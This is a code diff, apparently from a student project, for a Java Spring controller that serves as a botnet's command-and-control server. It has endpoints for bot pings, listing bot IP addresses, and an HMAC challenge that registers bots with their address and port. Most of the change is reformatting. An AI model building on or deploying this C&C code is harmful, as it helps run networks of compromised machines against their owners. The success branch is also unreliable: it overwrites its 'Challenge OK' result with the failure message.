@@ -30,109 +30,110 @@ import cs.sii.model.Pairs;
 
 @Controller
 public class CommandController {
-	
+
 	@Autowired
 	private Engine engineBot;
-	
+
 	@Autowired
 	private CryptoAuth auth;
-	
+
 	@Autowired
 	private BotterRepository botRepository;
-	
+
 	@Autowired
 	private NetworkService networkService;
 
-    // Controller che intercetta i ping dei bot
-    @RequestMapping(value = "/BotPing", method = RequestMethod.POST)
-    @ResponseBody
-    public String BotPing(HttpServletResponse error) throws IOException {	
-    	String response="";
-    	if(engineBot.isCommandandconquerStatus()){
-    		 response="ping";
-    	}else{
-    		error.sendError(HttpStatus.SC_NOT_FOUND);
-    	}
-    	return response;
-       
-    }
-	    
-    @RequestMapping(value = "/BotNet", method = RequestMethod.GET)
+	// Controller che intercetta i ping dei bot
+	@RequestMapping(value = "/BotPing", method = RequestMethod.POST)
+	@ResponseBody
+	public String BotPing(HttpServletResponse error) throws IOException {
+		String response = "";
+		if (engineBot.isCommandandconquerStatus()) {
+			response = "ping";
+		} else {
+			error.sendError(HttpStatus.SC_NOT_FOUND);
+		}
+		return response;
+
+	}
+
+	@RequestMapping(value = "/BotNet", method = RequestMethod.GET)
 	@ResponseBody
 	public List<IP> getAllBotNet(HttpServletResponse error) throws IOException {
-    	List<IP> response=new ArrayList<IP>();
-    	
-    	if(engineBot.isCommandandconquerStatus()){
-    		response=networkService.getBotIps().getIPList();
-    	}else{
-    		error.sendError(HttpStatus.SC_NOT_FOUND);
-    	}
+		List<IP> response = new ArrayList<IP>();
+
+		if (engineBot.isCommandandconquerStatus()) {
+			response = networkService.getBotIps().getIPList();
+		} else {
+			error.sendError(HttpStatus.SC_NOT_FOUND);
+		}
 		return response;
 	}
 
-    //CONTROLLER PER LA GESTIONE DELLA CHALLENGE DI AUTENTICAZIONE//////
-    
-    @RequestMapping(value = "/welcome", method = RequestMethod.POST)
-   	@ResponseBody
-   	public Pairs<Long,Integer> botFirstAcces(@RequestBody String idBot,HttpServletResponse error) throws IOException {  
-    		System.out.println("1");
-    		Pairs<Long,Integer> response=new Pairs<>();
-    		if(engineBot.isCommandandconquerStatus()){
-    			Long keyNumber=new Long(auth.generateNumberText());    	
-    	    	Integer iterationNumber=new Integer(auth.generateIterationNumber());   
-    	    	auth.addBotChallengeInfo(idBot,keyNumber, iterationNumber);   	    	
-    	    	response=new Pairs<Long, Integer>(keyNumber,iterationNumber);
-    		}else{
-    			error.sendError(HttpStatus.SC_NOT_FOUND);
-    		}
-    		System.out.println("2");
+	// CONTROLLER PER LA GESTIONE DELLA CHALLENGE DI AUTENTICAZIONE//////
 
-    		return response;
-   	}
-    
-    @RequestMapping(value = "/hmac", method = RequestMethod.POST)
-   	@ResponseBody
-   	public String botFirstAccesSecondPhase(@RequestBody ArrayList<Object> objects, HttpServletResponse error,HttpServletRequest request) throws IOException {  
-    	String response="";
+	@RequestMapping(value = "/welcome", method = RequestMethod.POST)
+	@ResponseBody
+	public Pairs<Long, Integer> botFirstAcces(@RequestBody String idBot, HttpServletResponse error) throws IOException {
+		System.out.println("1");
+		Pairs<Long, Integer> response = new Pairs<>();
+		if (engineBot.isCommandandconquerStatus()) {
+			Long keyNumber = new Long(auth.generateNumberText());
+			Integer iterationNumber = new Integer(auth.generateIterationNumber());
+			auth.addBotChallengeInfo(idBot, keyNumber, iterationNumber);
+			response = new Pairs<Long, Integer>(keyNumber, iterationNumber);
+		} else {
+			error.sendError(HttpStatus.SC_NOT_FOUND);
+		}
+		System.out.println("2");
 
-    	if(engineBot.isCommandandconquerStatus()){
-    			if(auth.findBotChallengeInfo(objects.get(1).toString())){
-   				
-    				String idBot=objects.get(1).toString();
-    				Long keyNumber=auth.getBotSeed().get(idBot).getValue1();
-    				Integer iterationNumber=auth.getBotSeed().get(idBot).getValue2();
-    				
-    			if(auth.validateHmac(keyNumber, iterationNumber, objects.get(0).toString())){
-    				response="Challenge OK";
-    				Botter bot=new Botter(idBot,request.getRemoteAddr().toString(),objects.get(3).toString(),objects.get(2).toString());
-    				botRepository.save(bot);
-    			}
-    				
-    				response="Challenge con HMAC non valido";
-    			}
-    	}else{
-    		response= "Challenge Error";
-    		error.sendError(HttpStatus.SC_NOT_FOUND);
-    	}  	
-    	return response;
-   	}
-    
-    /////////////////////////////////////////////////////////////////////////
-    
-    @RequestMapping(value = "/test", method = RequestMethod.GET)
-   	public ModelAndView test() {
-    	ModelAndView mav = new ModelAndView("test");
+		return response;
+	}
 
-    	
-    	return mav;
-   	}
-    
-    @RequestMapping(value = "/prova", method = RequestMethod.GET)
-    @ResponseBody
-   	public String prova() {
+	@RequestMapping(value = "/hmac", method = RequestMethod.POST)
+	@ResponseBody
+	public String botFirstAccesSecondPhase(@RequestBody ArrayList<Object> objects, HttpServletResponse error,
+			HttpServletRequest request) throws IOException {
+		String response = "";
 
-    	
-    	return engineBot.getIdBot();
-   	}
-    
+		if (engineBot.isCommandandconquerStatus()) {
+			if (auth.findBotChallengeInfo(objects.get(1).toString())) {
+
+				String idBot = objects.get(1).toString();
+				Long keyNumber = auth.getBotSeed().get(idBot).getValue1();
+				Integer iterationNumber = auth.getBotSeed().get(idBot).getValue2();
+
+				if (auth.validateHmac(keyNumber, iterationNumber, objects.get(0).toString())) {
+					response = "Challenge OK";
+					botRepository
+							.save(new Botter(idBot, request.getRemoteAddr().toString() + ":" + request.getRemotePort(),
+									objects.get(3).toString(), objects.get(2).toString()));
+					//TODO DA decidere send some peers
+				}
+
+				response = "Challenge con HMAC non valido";
+			}
+		} else {
+			response = "Challenge Error";
+			error.sendError(HttpStatus.SC_NOT_FOUND);
+		}
+		return response;
+	}
+
+	/////////////////////////////////////////////////////////////////////////
+
+	@RequestMapping(value = "/test", method = RequestMethod.GET)
+	public ModelAndView test() {
+		ModelAndView mav = new ModelAndView("test");
+
+		return mav;
+	}
+
+	@RequestMapping(value = "/prova", method = RequestMethod.GET)
+	@ResponseBody
+	public String prova() {
+
+		return engineBot.getIdBot();
+	}
+
 }
